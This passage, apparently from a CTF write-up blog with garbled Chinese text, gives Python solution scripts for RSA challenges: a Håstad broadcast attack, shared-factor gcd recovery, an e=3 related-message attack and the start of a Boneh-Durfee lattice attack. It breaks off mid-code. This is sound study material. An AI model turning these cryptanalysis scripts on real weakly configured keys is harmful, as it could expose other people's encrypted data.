punctuation">]</span>    C <span class="token operator">=</span> <span class="token punctuation">[</span>c1<span class="token punctuation">,</span> c2<span class="token punctuation">,</span> c3<span class="token punctuation">]</span>    N <span class="token operator">=</span> <span class="token number">1</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> n<span class="token punctuation">:</span>        N <span class="token operator">*=</span> i    Ni <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> n<span class="token punctuation">:</span>        Ni<span class="token punctuation">.</span>append<span class="token punctuation">(</span>N <span class="token operator">/</span> i<span class="token punctuation">)</span>    T <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> xrange<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        T<span class="token punctuation">.</span>append<span class="token punctuation">(</span>long<span class="token punctuation">(</span>invert<span class="token punctuation">(</span>Ni<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> n<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    X <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> xrange<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        X <span class="token operator">+=</span> C<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">*</span> Ni<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">*</span> T<span class="token punctuation">[</span>i<span class="token punctuation">]</span>    m3 <span class="token operator">=</span> X <span class="token operator">%</span> N    m <span class="token operator">=</span> iroot<span class="token punctuation">(</span>m3<span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> m<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>m <span class="token operator">=</span> hex<span class="token punctuation">(</span>broadcast<span class="token punctuation">(</span>n1<span class="token punctuation">,</span>n2<span class="token punctuation">,</span>n3<span class="token punctuation">,</span>c1<span class="token punctuation">,</span>c2<span class="token punctuation">,</span>c3<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span></code></pre><p>Ëã•ÊòØÁªôÂá∫‰∏§ÁªÑnÁöÑËØùÔºåÁõ¥Êé•ÂèØ‰ª•ÈááÁî®Ê±Ç‰∏§‰∏™nÁöÑÂÖ¨Á∫¶Êï∞ÁöÑÊñπÊ≥ïËøõË°åÊîªÂáª„ÄÇ</p><p>code:</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># from libnum import gcd</span><span class="token comment" spellcheck="true"># n1=0xb4e9991d2fac12b098b01118d960eb5470261368e7b1ff2da2c66b4302835aa845dd50a4f749fea749c6d439156df6faf8d14ce2a57da3bac542f1843bfc80dfd632e7a2ef96496a660d8c5994aea9e1b665097503558bc2756ab06d362abe3777d8c1f388c8cd1d193955b70053382d330125bdc2cdc836453f1a26cec1021cbb787977336b2300f38c6ba881a93d2a2735f8f0d32ea2d0e9527eb15294dd0867c8030d1f646bd121c01706c247cd1bf4aa209d383ffb748b73ec1688dc71812675834b4b12d27a63b5b8fcc47394d16897ff96af49f39d8d5b247553fbf8fac7be08aab43d9ce5659cd5cfaf7d73edbcfe854d997ae4b28d879adf86641707</span><span class="token comment" spellcheck="true"># #  e1=0x10001</span><span class="token comment" spellcheck="true"># #  c1=0x3a10c58ed3e8f9eade48dad7d36518dabeeca3d169c848f3b4b2bb027220e13d8b071c55046b14213e966ad9c381e5cad9773d455aa0d36ddff9b9f24873d0979f1caff95d9569e4f312514c7e01979b39c466aa2d27ad521ae3c1ea2025ca2290185b3d79da4f6e4c7e77a70f206bd5c41eec65fd64f86c317b8207ca511b8297b597cb9c24afa652c1f1c7f2d8ca61cf4a63b17df165e4c02dc19578305f276cb81fdfadf0ffc8b86e13297f2692edf7e6324878bb8ca960a050af6b0ada8ba4accd72c7d2c74a41e98d801093e4cc5b1572b8e6be9f270c30759543986180bb4fc6863e14638ea74863dbdd1624cfdedaedb99dfd48901e7d4b486a7b13ea</span><span class="token comment" spellcheck="true"># n2=0xc31344c753e25135d5eed8febaa57dd7020b503a5569bdd4ae6747b5c36436dc1c4d7ead77bfc1034748bcc630636bae1c8f4ca5dee8246b3d6f3e8b14e16487733b14ec8e587e07a7a6de45859d32d241eaf7746c45ff404f1a767ab77e8493ae8141fee0bcf4e9b7c455415b6945fa60de928b01dfa90bbf0d09194f93db7a1663121d281c908f0e38237f63c2b856f99c6029d993f9afb5fbbb762044d97943ff34023486c4cf1db9ffdc439d9f5ff331b606374c7133d61e4614fac3ea7faaf54563338b736282658e7925b224577091831351a28679a8d6f8e7ba16685b2769bb49b79f8054b29c809d68aca0f2c5e3f1fd0e3ef6c21f756e3c44a40439</span><span class="token comment" spellcheck="true"># # e2=0x10001</span><span class="token comment" spellcheck="true"># # c2=0xbefa7d62f15cafc81d098fdd524411537e948d83266ef22848f44d2e43d1f1388a26bb21c8fb08b571c7cbd6630d6f2b409c85c68a6419e472941e4978f60b93e1ce850344dbe99f1918cb5b8c35075bbdca82fa233d1300f108e4b75ce10d7b0ffa145bceffbc7a5204bf9c119f77af191091f25140aedcdd333b631b240ddad3108c96084dffe6e49e04880908fa02c02edb58e2f27919d707151adb6787384ca28050f8d77418cc1733187d7695f57127be8d6174562723679ba39790d7f2306271b9d8f4d2bdde9ed798af00074ec7da3a7f1ffeb4fc6a61804e51c0f92d384dc62b80fd44492588af26ac0185a23f86c46a7ffdec9fcf31b02b08b63001</span><span class="token comment" spellcheck="true"># print "p -> {}".format(gcd(n1, n2))</span><span class="token comment" spellcheck="true"># print "q1 -> {}".format(n1 / gcd(n1, n2))</span><span class="token comment" spellcheck="true"># print "q2 -> {}".format(n2 / gcd(n1, n2))</span>q <span class="token operator">=</span> <span class="token number">161993393900030566867150602363721535479433489542726899362944130872107225598993516228193877689420023695231584876954537089973673478074348422697619820309397363583748523503035462772765277978491082324620122838540365168604124924805412323471486221429513024367107238770298040268787441768635257727315317704741778501737</span>p1 <span class="token operator">=</span> <span class="token number">92392842076088454558676873885205432277688794102622657192126179753576488966439636785821047115301443362169549898465575056742381428321997570097374526363913597739756884031644135343404225885226264566916462715686341654211514913366341960827374747754358972050549971216117165750261475461979495685882564817634194301271</span>p2 <span class="token operator">=</span> <span class="token number">90279376687119715076904357810855212347782022402759254635072438787841245581930716927541800564582197695494423401147385731042364986596482750220701857807271816829238846312998439918616452075752787878425283820635199121653984306111110530896331011530772771558835563313746863033189248831495407320154948117671577602867</span><span class="token comment" spellcheck="true">#p=getPrime(1024)</span><span class="token comment" spellcheck="true">#q=getPrime(1024)</span>e<span class="token operator">=</span><span class="token number">65537</span>n<span class="token operator">=</span>p1<span class="token operator">*</span>qc <span class="token operator">=</span> <span class="token number">2482083893746618248544426737023750400124543452082436334398504986023501710639402060949106693279462896968839029712099336235976221571564642900240827774719199533124053953157919850838214021934907480633441577316263853011232518392904983028052155862154264401108124968404098823946691811798952747194237290581323868666637357604693015079007555594974245559555518819140844020498487432684946922741232053249894575417796067090655122702306134848220257943297645461477488086804856018323986796999103385565540496534422406390355987976815450744535949785073009043007159496929187184338592859040917546122343981520508220332785862546608841127597</span>fn <span class="token operator">=</span> <span class="token punctuation">(</span>p1<span class="token number">-1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token number">-1</span><span class="token punctuation">)</span>d <span class="token operator">=</span> <span class="token number">3966878437245643631637564975732704690837306124446086877872976205025646385675581853511438558449272831057566720069483322716185302889500282616707242022434828280064159692586323031389171478503753908040157812124377949328353938367107704570961998942943251122002994862593199357765354157601632561816952286250637771656438228389552713018311110406430345367091645709437632368795499521650765928713846948596775009799649123556193038678824282362527557831582015129491351042998117090300454963836491928898672785463727735926420386710315758459309854603319606229977802586942578329763497502143858265135463947731426008988290087504887177240673</span>m <span class="token operator">=</span> pow<span class="token punctuation">(</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span></code></pre><h2 id="‚ùéChallenge-5"><a href="#‚ùéChallenge-5" class="headerlink" title="‚ùéChallenge 5"></a>‚ùéChallenge 5</h2><p>Â∑≤Áü•nÂíå‰∏§‰∏™cipherÔºåÂπ∂‰∏îÊòØÁî±mÂíåm+1Âä†ÂØÜËÄåÊù•„ÄÇ</p><pre class=" language-python"><code class="language-python"><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>Generating challenge <span class="token number">5</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>n<span class="token operator">=</span>0x198f61bc7d2977139120b86b739afbd04e82726a7dcf514cc2ad46c7002d2202915ba932364d71b7dd1928fb6861f984d8d9e31e70d0023aca721130e1df2825568a623c8316fd555616d91897a2db5d1df973a1584ed4cfb0f55d910db5ff64a79f061ef71b2362b6c2af8416a5a47094aff428d6c541448df45436ec48f93L<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>e<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>m<span class="token operator">=</span>random<span class="token punctuation">.</span>getrandbits<span class="token punctuation">(</span><span class="token number">512</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>c<span class="token operator">=</span>pow<span class="token punctuation">(</span>m<span class="token punctuation">,</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token operator">=</span>0x13a5213f8946b3da1b37a7346f7985ed17329b05c31cc72912e15ab62c2b578f95148f7f2fb3daed063f5517efd9694d8a87792b675715d50d9113baa0bbfb1791f8e551ce5583c3dc31adf37dced9dab4acf3e58a5f3e203b1c971a746de5e9ac0b4d0153538f9392a0ce12250c5597eb23f07b4d7c84a084fc1dd0dee6b1cL<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>x<span class="token operator">=</span>pow<span class="token punctuation">(</span>m<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token operator">=</span>0xa864c9ffa08edc2d2a380fde218fe07204193c43580ee0a3fd1505e3f60125c3f380fab24bbd344bca174f3b5b09ed271b817cb08fa6087f2b9d2216a1c7782714c50f475b0e3ca8b530ae33f4f4fb72c14ac0331b107d9dfcbbb193ac6946edd01e9cf5cab799a444dd9a49eb5362f6a499fa69540ac1d3dfbb977f57cd8eL</code></pre><p>ÈÄöËøáÂåñÁÆÄÂæóÂà∞ <code>ËÆ°ÁÆóÂÖ¨ÂºèÔºö (m+1)^3 - m^3 = c2-c1 ==&gt; (3m^2+3m+1)Âä†Âáèk*n=c2-c1</code></p><p>‰∏ÄÂÖÉ‰∫åÊ¨°ÊñπÁ®ãÊ±ÇÊ†πÔºö</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190529105312.png" alt=""></p><p>Ê≠§Êó∂Âè™ÈúÄÊ±ÇÁ¨¶ÂêàÊù°‰ª∂ÁöÑkÂÄºÂç≥ÂèØ„ÄÇ</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> gmpy2<span class="token comment" spellcheck="true"># Ê±Ç‰∏ÄÂÖÉ‰∫åÊ¨°ÊñπÁ®ãÊ†π</span>n<span class="token operator">=</span>0x198f61bc7d2977139120b86b739afbd04e82726a7dcf514cc2ad46c7002d2202915ba932364d71b7dd1928fb6861f984d8d9e31e70d0023aca721130e1df2825568a623c8316fd555616d91897a2db5d1df973a1584ed4cfb0f55d910db5ff64a79f061ef71b2362b6c2af8416a5a47094aff428d6c541448df45436ec48f93Lc1<span class="token operator">=</span>0x13a5213f8946b3da1b37a7346f7985ed17329b05c31cc72912e15ab62c2b578f95148f7f2fb3daed063f5517efd9694d8a87792b675715d50d9113baa0bbfb1791f8e551ce5583c3dc31adf37dced9dab4acf3e58a5f3e203b1c971a746de5e9ac0b4d0153538f9392a0ce12250c5597eb23f07b4d7c84a084fc1dd0dee6b1cLc2<span class="token operator">=</span>0xa864c9ffa08edc2d2a380fde218fe07204193c43580ee0a3fd1505e3f60125c3f380fab24bbd344bca174f3b5b09ed271b817cb08fa6087f2b9d2216a1c7782714c50f475b0e3ca8b530ae33f4f4fb72c14ac0331b107d9dfcbbb193ac6946edd01e9cf5cab799a444dd9a49eb5362f6a499fa69540ac1d3dfbb977f57cd8eLe<span class="token operator">=</span><span class="token number">3</span>m <span class="token operator">=</span> <span class="token string">''</span><span class="token comment" spellcheck="true"># 3m^2+3m+1=c2-c1</span><span class="token comment" spellcheck="true"># ‚ñ≤ = 9-4*3*(1-c2+c1)</span><span class="token comment" spellcheck="true"># x = (-b[+-](‚ñ≤)^0.5)/(2*a)==>ÂèØ‰ª•Áü•ÈÅìx‰∏∫mÔºåÂç≥‰∏∫Êï¥Êï∞</span><span class="token comment" spellcheck="true"># c = 1-c2+c1-(k*n)</span>k <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">while</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    c<span class="token operator">=</span><span class="token number">1</span><span class="token operator">-</span>n<span class="token operator">*</span>k<span class="token operator">+</span><span class="token punctuation">(</span>c1<span class="token operator">-</span>c2<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#print(c)</span>    delta <span class="token operator">=</span> <span class="token number">9</span><span class="token operator">-</span><span class="token number">4</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">*</span>c    <span class="token comment" spellcheck="true">#print(delta)</span>    <span class="token keyword">if</span> delta<span class="token operator">></span><span class="token number">0</span><span class="token punctuation">:</span>        <span class="token comment" spellcheck="true">#print(iroot(delta,2)[1])</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>iroot<span class="token punctuation">(</span>delta<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>iroot<span class="token punctuation">(</span><span class="token number">9</span><span class="token operator">-</span><span class="token number">12</span><span class="token operator">*</span>c<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">6</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    m<span class="token operator">=</span><span class="token punctuation">(</span>iroot<span class="token punctuation">(</span><span class="token number">9</span><span class="token operator">-</span><span class="token number">12</span><span class="token operator">*</span>c<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">6</span> <span class="token comment" spellcheck="true">#Ê±ÇÊ†π</span>                    <span class="token keyword">if</span> pow<span class="token punctuation">(</span>m<span class="token punctuation">,</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token operator">==</span>c1<span class="token punctuation">:</span>                        <span class="token keyword">print</span><span class="token punctuation">(</span>hex<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span>                        <span class="token keyword">print</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#i = 17Êó∂Á¨¶ÂêàÊù°‰ª∂</span>                        exit<span class="token punctuation">(</span><span class="token punctuation">)</span>    k <span class="token operator">+=</span> <span class="token number">1</span></code></pre><h2 id="‚ùéChallenge-6"><a href="#‚ùéChallenge-6" class="headerlink" title="‚ùéChallenge 6"></a>‚ùéChallenge 6</h2><p>Boneh and Durfee attack.ÔºàÂΩìdÁöÑbitsÊï∞Â∞è‰∫énÁöÑ‰∏ÄÂÆöÁ®ãÂ∫¶Êó∂ÔºåÂèØÈááÁî®Ê≠§ÊîªÂáª„ÄÇÈ¢ò‰∏≠Âá∫Áé∞‰∫Ü<code>d=random.getrandbits(1024*0.270)</code>Ôºâ</p><pre class=" language-python"><code class="language-python"><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>Generating challenge <span class="token number">6</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>n<span class="token operator">=</span>0xbadd260d14ea665b62e7d2e634f20a6382ac369cd44017305b69cf3a2694667ee651acded7085e0757d169b090f29f3f86fec255746674ffa8a6a3e1c9e1861003eb39f82cf74d84cc18e345f60865f998b33fc182a1a4ffa71f5ae48a1b5cb4c5f154b0997dc9b001e441815ce59c6c825f064fdca678858758dc2cebbc4d27L<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>d<span class="token operator">=</span>random<span class="token punctuation">.</span>getrandbits<span class="token punctuation">(</span><span class="token number">1024</span><span class="token operator">*</span><span class="token number">0.270</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>e<span class="token operator">=</span>invmod<span class="token punctuation">(</span>d<span class="token punctuation">,</span>phin<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>hex<span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token operator">=</span>0x11722b54dd6f3ad9ce81da6f6ecb0acaf2cbc3885841d08b32abc0672d1a7293f9856db8f9407dc05f6f373a2d9246752a7cc7b1b6923f1827adfaeefc811e6e5989cce9f00897cfc1fc57987cce4862b5343bc8e91ddf2bd9e23aea9316a69f28f407cfe324d546a7dde13eb0bd052f694aefe8ec0f5298800277dbab4a33bbL<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>m<span class="token operator">=</span>random<span class="token punctuation">.</span>getrandbits<span class="token punctuation">(</span><span class="token number">512</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>c<span class="token operator">=</span>pow<span class="token punctuation">(</span>m<span class="token punctuation">,</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token operator">=</span>0xe3505f41ec936cf6bd8ae344bfec85746dc7d87a5943b3a7136482dd7b980f68f52c887585d1c7ca099310c4da2f70d4d5345d3641428797030177da6cc0d41e7b28d0abce694157c611697df8d0add3d900c00f778ac3428f341f47ecc4d868c6c5de0724b0c3403296d84f26736aa66f7905d498fa1862ca59e97f8f866cL<span class="token punctuation">[</span><span class="token operator">-</span><span class="token punctuation">]</span>long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token operator">=</span></code></pre><p>code:</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> time<span class="token comment" spellcheck="true">############################################</span><span class="token comment" spellcheck="true"># Config</span><span class="token comment" spellcheck="true">##########################################</span><span class="token triple-quoted-string string">"""Setting debug to true will display more informationsabout the lattice, the bounds, the vectors..."""</span>debug <span class="token operator">=</span> <span class="token boolean">True</span><span class="token triple-quoted-string string">"""Setting strict to true will stop the algorithm (andreturn (-1, -1)) if we don't have a correct upperbound on the determinant. Note that this doesn't necesseraly mean that no solutions will be found since the theoretical upperbound isusualy far away from actual results. That is whyyou should probably use `strict = False`"""</span>strict <span class="token operator">=</span> <span class="token boolean">False</span><span class="token triple-quoted-string string">"""This is experimental, but has provided remarkable resultsso far. It tries to reduce the lattice as much as it canwhile keeping its efficiency. I see no reason not to usethis option, but if things don't work, you should trydisabling it"""</span>helpful_only <span class="token operator">=</span> <span class="token boolean">True</span>dimension_min <span class="token operator">=</span> <span class="token number">7</span> <span class="token comment" spellcheck="true"># stop removing if lattice reaches that dimension</span><span class="token comment" spellcheck="true">############################################</span><span class="token comment" spellcheck="true"># Functions</span><span class="token comment" spellcheck="true">##########################################</span><span class="token comment" spellcheck="true"># display stats on helpful vectors</span><span class="token keyword">def</span> <span class="token function">helpful_vectors</span><span class="token punctuation">(</span>BB<span class="token punctuation">,</span> modulus<span class="token punctuation">)</span><span class="token punctuation">:</span>    nothelpful <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">for</span> ii <span class="token keyword">in</span> range<span class="token punctuation">(</span>BB<span class="token punctuation">.</span>dimensions<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> BB<span class="token punctuation">[</span>ii<span class="token punctuation">,</span>ii<span class="token punctuation">]</span> <span class="token operator">>=</span> modulus<span class="token punctuation">:</span>            nothelpful <span class="token operator">+=</span> <span class="token number">1</span>    <span class="token keyword">print</span> nothelpful<span class="token punctuation">,</span> <span class="token string">"/"</span><span class="token punctuation">,</span> BB<span class="token punctuation">.</span>dimensions<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">" vectors are not helpful"</span><span class="token comment" spellcheck="true"># display matrix picture with 0 and X</span><span class="token keyword">def</span> <span class="token function">matrix_overview</span><span class="token punctuation">(</span>BB<span class="token punctuation">,</span> bound<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> ii <span class="token keyword">in</span> range<span class="token punctuation">(</span>BB<span class="token punctuation">.</span>dimensions<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        a <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'%02d '</span> <span class="token operator">%</span> ii<span class="token punctuation">)</span>        <span class="token keyword">for</span> jj <span class="token keyword">in</span> range<span class="token punctuation">(</span>BB<span class="token punctuation">.</span>dimensions<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            a <span class="token operator">+=</span> <span class="token string">'0'</span> <span class="token keyword">if</span> BB<span class="token punctuation">[</span>ii<span class="token punctuation">,</span>jj<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token keyword">else</span> <span class="token string">'X'</span>            <span class="token keyword">if</span> BB<span class="token punctuation">.</span>dimensions<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token number">60</span><span class="token punctuation">:</span>                a <span class="token operator">+=</span> <span class="token string">' '</span>        <span class="token keyword">if</span> BB<span class="token punctuation">[</span>ii<span class="token punctuation">,</span> ii<span class="token punctuation">]</span> <span class="token operator">>=</span> bound<span class="token punctuation">:</span>            a <span class="token operator">+=</span> <span class="token string">'~'</span>        <span class="token keyword">print</span> a<span class="token comment" spellcheck="true"># tries to remove unhelpful vectors</span><span class="token comment" spellcheck="true"># we start at current = n-1 (last vector)</span><span class="token keyword">def</span> <span class="token function">remove_unhelpful</span><span class="token punctuation">(</span>BB<span class="token punctuation">,</span> monomials<span class="token punctuation">,</span> bound<span class="token punctuation">,</span> current<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true"># end of our recursive function</span>    <span class="token keyword">if</span> current <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token operator">or</span> BB<span class="token punctuation">.</span>dimensions<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">&lt;=</span> dimension_min<span class="token punctuation">:</span>        <span class="token keyword">return</span> BB    <span class="token comment" spellcheck="true"># we start by checking from the end</span>    <span class="token keyword">for</span> ii <span class="token keyword">in</span> range<span class="token punctuation">(</span>current<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment" spellcheck="true"># if it is unhelpful:</span>        <span class="token keyword">if</span> BB<span class="token punctuation">[</span>ii<span class="token punctuation">,</span> ii<span class="token punctuation">]</span> <span class="token operator">>=</span> bound<span class="token punctuation">:</span>            affected_vectors <span class="token operator">=</span> <span class="token number">0</span>            affected_vector_index <span class="token operator">=</span> <span class="token number">0</span>            <span class="token comment" spellcheck="true"># let's check if it affects other vectors</span>            <span class="token keyword">for</span> jj <span class="token keyword">in</span> range<span class="token punctuation">(</span>ii <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> BB<span class="token punctuation">.</span>dimensions<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token comment" spellcheck="true"># if another vector is affected:</span>                <span class="token comment" spellcheck="true"># we increase the count</span>                <span class="token keyword">if</span> BB<span class="token punctuation">[</span>jj<span class="token punctuation">,</span> ii<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>                    affected_vectors <span class="token operator">+=</span> <span class="token number">1</span>                    affected_vector_index <span class="token operator">=</span> jj            <span class="token comment" spellcheck="true"># level:0</span>            <span class="token comment" spellcheck="true"># if no other vectors end up affected</span>            <span class="token comment" spellcheck="true"># we remove it</span>            <span class="token keyword">if</span> affected_vectors <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>                <span class="token keyword">print</span> <span class="token string">"* removing unhelpful vector"</span><span class="token punctuation">,</span> ii                BB <span class="token operator">=</span> BB<span class="token punctuation">.</span>delete_columns<span class="token punctuation">(</span><span class="token punctuation">[</span>ii<span class="token punctuation">]</span><span class="token punctuation">)</span>                BB <span class="token operator">=</span> BB<span class="token punctuation">.</span>delete_rows<span class="token punctuation">(</span><span class="token punctuation">[</span>ii<span class="token punctuation">]</span><span class="token punctuation">)</span>                monomials<span class="token punctuation">.</span>pop<span class="token punctuation">(</span>ii<span class="token punctuation">)</span>                BB <span class="token operator">=</span> remove_unhelpful<span class="token punctuation">(</span>BB<span class="token punctuation">,</span> monomials<span class="token punctuation">,</span> bound<span class="token punctuation">,</span> ii<span class="token number">-1</span><span class="token punctuation">)</span>                <span class="token keyword">return</span> BB            <span class="token comment" spellcheck="true"># level:1</span>            <span class="token comment" spellcheck="true"># if just one was affected we check</span>            <span class="token comment" spellcheck="true"># if it is affecting someone else</span>            <span class="token keyword">elif</span> affected_vectors <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>                affected_deeper <span class="token operator">=</span> <span class="token boolean">True</span>                <span class="token keyword">for</span> kk <span class="token keyword">in</span> range<span class="token punctuation">(</span>affected_vector_index <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> BB<span class="token punctuation">.</span>dimensions<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    <span class="token comment" spellcheck="true"># if it is affecting even one vector</span>                    <span class="token comment" spellcheck="true"># we give up on this one</span>                    <span class="token keyword">if</span> BB<span class="token punctuation">[</span>kk<span class="token punctuation">,</span> affected_vector_index<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>                        affected_deeper <span class="token operator">=</span> <span class="token boolean">False</span>                <span class="token comment" spellcheck="true"># remove both it if no other vector was affected and</span>                <span class="token comment" spellcheck="true"># this helpful vector is not helpful enough</span>                <span class="token comment" spellcheck="true"># compared to our unhelpful one</span>                <span class="token keyword">if</span> affected_deeper <span class="token operator">and</span> abs<span class="token punctuation">(</span>bound <span class="token operator">-</span> BB<span class="token punctuation">[</span>affected_vector_index<span class="token punctuation">,</span> affected_vector_index<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> abs<span class="token punctuation">(</span>bound <span class="token operator">-</span> BB<span class="token punctuation">[</span>ii<span class="token punctuation">,</span> ii<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    <span class="token keyword">print</span> <span class="token string">"* removing unhelpful vectors"</span><span class="token punctuation">,</span> ii<span class="token punctuation">,</span> <span class="token string">"and"</span><span class="token punctuation">,</span> affected_vector_index                    BB <span class="token operator">=</span> BB<span class="token punctuation">.</span>delete_columns<span class="token punctuation">(</span><span class="token punctuation">[</span>affected_vector_index<span class="token punctuation">,</span> ii<span class="token punctuation">]</span><span class="token punctuation">)</span>                    BB <span class="token operator">=</span> BB<span class="token punctuation">.</span>delete_rows<span class="token punctuation">(</span><span class="token punctuation">[</span>affected_vector_index<span class="token punctuation">,</span> ii<span class="token punctuation">]</span><span class="token punctuation">)</span>                    monomials<span class="token punctuation">.</span>pop<span class="token punctuation">(</span>affected_vector_index<span class="token punctuation">)</span>                    monomials<span class="token punctuation">.</span>pop<span class="token punctuation">(</span>ii<span class="token punctuation">)</span>                    BB <span class="token operator">=</span> remove_unhelpful<span class="token punctuation">(</span>BB<span class="token punctuation">,</span> monomials<span class="token punctuation">,</span> bound<span class="token punctuation">,</span> ii<span class="token number">-1</span><span class="token punctuation">)</span>                    <span class="token keyword">return</span> BB    <span class="token comment" 